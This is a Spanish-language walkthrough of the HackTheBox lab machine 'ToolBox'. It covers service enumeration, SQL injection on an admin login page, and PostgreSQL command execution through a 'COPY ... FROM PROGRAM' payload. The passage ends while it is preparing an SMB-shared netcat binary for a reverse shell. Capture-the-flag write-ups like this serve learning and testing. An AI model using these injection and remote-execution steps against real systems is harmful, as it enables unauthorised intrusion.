---
title : Máquina|TOOLBOX|HTB|POSTGRESTSqlRCE|PIVOTING
published : True
---

<div class="contenedor imgc">
    <img class="imgc" src="imgs/ToolBox/ToolBox0.png" style="border-radius: 150px; width: 169px" alt="ToolBox logo">
    <div> 
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Dificultad: Fácil </p>
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Url: <a href="https://app.hackthebox.com/machines/339" style="color: lightblue;">Tool Box</a></p>
    </div>
</div>

<h2><font color="white"><center> # Tool Box</center></font></h2>

* Empezamos tirando una traza ICMP, y vemos que nos enfrentamos  a una maquina Linux.

<img src="imgs/ToolBox/ToolBox1.png">

* Posteriormente empezamos con la enumeración de servicio y version que corren bajo los puertos de esta maquina, como cosas relevantes: 
<center>[Ftp]21: docker-toolbox.exe</center>

<img src="imgs/ToolBox/ToolBox2.png">

* Vemos de que se trata el recurso compartido por ftp llamado docker-toolbox.exe empleando una session como anonymous.

<img src="imgs/ToolBox/ToolBox6.png">

* Empezamos conectarnos con openssl para ver la firma de certificado ssl, y nos encontramos con subdominios bajo esta maquina.
<center>admin.megalogistic.com</center>
<center>megalogistic.com</center>

<img src="imgs/ToolBox/ToolBox3.png">


* Procedemos a agregarlos en el /etc/hosts paraopenssl que apunte a la dirección IP de la maquina.

<img src="imgs/ToolBox/ToolBox4.png">

* Vemos mas información que nos puede listar crackmapexec.
<center>Maquina:   Windows</center>
<center>Arquitectura: 64 bts</center>
<center>Nombre: TOOLBOX </center>
<img src="imgs/ToolBox/ToolBox5.png">

* Se puede observer que le panel de login de admin.megalogistic.com es vulnerables a un ataque de inyección Sql

<img src="imgs/ToolBox/ToolBox7.png">

* Empezamos a usar Burpsuite para ver el trafico de salida y respuesta por parte del servidor.
<center>Win + r : Enviar al Repeter</center>

<img src="imgs/ToolBox/ToolBox8.png">


* Investigamos acerca de como inyectar código arbitrario para ello.

* Eliminación de tabla en el caso de que sea existente.

```sql
DROP TABLE IF EXIST cmd_exec;
```

* Creación de la tabla para la inyección de comando arbitrarios.

```sql
 CREATE TABLE cmd_exec(cmd_output text);
```

* Inyección de comandos

```sql
 COPY cmd_exec from PROGRAM 'whoami';
```

* Empezamos con la creación de la tabla.

<img src="imgs/ToolBox/ToolBox10.png">

* Empezamos con la ejecución del código para ello me comparto un recurso compartido por smb que va a tener el binario netcat para poder crearme una reverse Shell suponiendo que pues la maquina es windows.
<center>Creamos recurso un recurso compartido.</center>
<img src="imgs/ToolBox/ToolBox11.png">

